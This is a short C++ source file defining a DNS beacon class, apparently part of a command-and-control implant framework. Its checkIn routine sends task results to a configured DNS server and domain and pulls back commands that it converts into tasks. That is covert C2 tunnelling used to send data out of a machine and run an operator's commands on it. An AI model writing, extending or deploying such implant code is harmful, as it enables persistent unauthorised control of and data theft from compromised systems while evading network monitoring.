#include "BeaconDns.hpp"

using namespace std;
using namespace dns;


BeaconDns::BeaconDns(const std::string& dnsServer, const std::string& domain)
	: Beacon("127.0.0.1", 666)
{
	m_client=new Client(dnsServer, domain);
}


BeaconDns::~BeaconDns()
{
	delete m_client;
}


void BeaconDns::checkIn()
{	
	DEBUG("initConnection");

	std::string output;
	taskResultsToCmd(output);

	DEBUG("sending output.size " << std::to_string(output.size()));

	m_client->sendMessage(output);

	std::string input = m_client->getMsg();
	while(!input.empty())
	{
		DEBUG("received input.size " << std::to_string(input.size()));
		cmdToTasks(input);
		input = m_client->getMsg();
	}
}

	



